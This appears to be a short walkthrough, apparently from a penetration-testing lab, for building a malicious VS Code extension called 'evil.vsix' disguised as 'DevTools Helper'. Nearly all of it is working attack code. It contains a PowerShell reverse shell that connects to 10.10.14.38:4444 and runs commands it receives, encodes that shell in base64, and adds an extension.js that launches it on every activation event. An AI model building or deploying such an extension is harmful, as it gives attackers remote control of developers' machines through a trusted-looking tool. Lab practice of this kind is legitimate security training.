Creating vsix structur
```shell
mkdir -p evil-ext/extension
cd evil-ext
```

Create `[Content_Types].xml`
```shell
cat > '[Content_Types].xml' << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="vsixmanifest" ContentType="application/xml"/>
  <Default Extension="js" ContentType="application/octet-stream"/>
</Types>
EOF
```

Create extension/package.json
```shell
cat > extension/package.json << 'EOF'
{
  "name": "devtools-helper",
  "displayName": "DevTools Helper",
  "version": "1.0.0",
  "engines": {"vscode": "^1.118.0"},
  "activationEvents": ["*"],
  "main": "./extension.js",
  "contributes": {}
}
EOF
```

Creating the Payload
```shell
cat > payload.ps1 << 'EOF'
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.38',4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
EOF
```

buat environtment PAYLOAD
```shell
PAYLOAD=$(cat payload.ps1 | iconv -t UTF-16LE | base64 -w 0)
```

Create extension.js
```shell
cat > extension/extension.js << EOF
const cp = require('child_process');
exports.activate = function() {
    cp.exec('powershell -e $PAYLOAD');
}
exports.deactivate = function() {}
EOF
```

packaging vsix files
```shell
zip -r evil.vsix '[Content_Types].xml' extension/
```

cek file
```shell
tree .
```